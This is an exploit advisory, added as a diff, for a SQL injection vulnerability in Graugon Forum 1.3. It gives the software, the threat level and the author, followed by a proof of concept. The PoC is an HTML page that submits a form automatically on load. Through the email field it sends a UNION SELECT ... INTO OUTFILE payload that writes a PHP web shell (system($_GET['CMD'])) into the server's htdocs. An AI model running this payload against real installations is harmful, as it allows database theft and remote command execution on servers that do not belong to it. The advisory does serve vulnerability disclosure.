@@ -1,0 +1,31 @@
+<!------------------------------------------------------------------------
+# Software................Graugon Forum 1.3
+# Vulnerability...........SQL Injection
+# Threat Level............Critical (4/5)
+# Download................http://www.graugon.com/
+# Discovery Date..........4/3/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# A SQL injection vulnerability in Graugon Forum 1.3 can be exploited to
+# extract arbitrary data. In some environments it may be possible to
+# create a PHP shell.
+# 
+# 
+# --PoC-->
+
+<html>
+    <body onload="document.forms[0].submit()">
+        <form method="POST" action="http://localhost/forum/admin.php">
+            <input type="hidden" name="email" value="'and 1=0 UNION SELECT '<?php system($_GET["CMD"]); ?>','','','','','' FROM dual INTO OUTFILE '../../htdocs/shell.php';#" />
+            <input type="hidden" name="password" value="" />   
+        </form>
+    </body>
+</html>
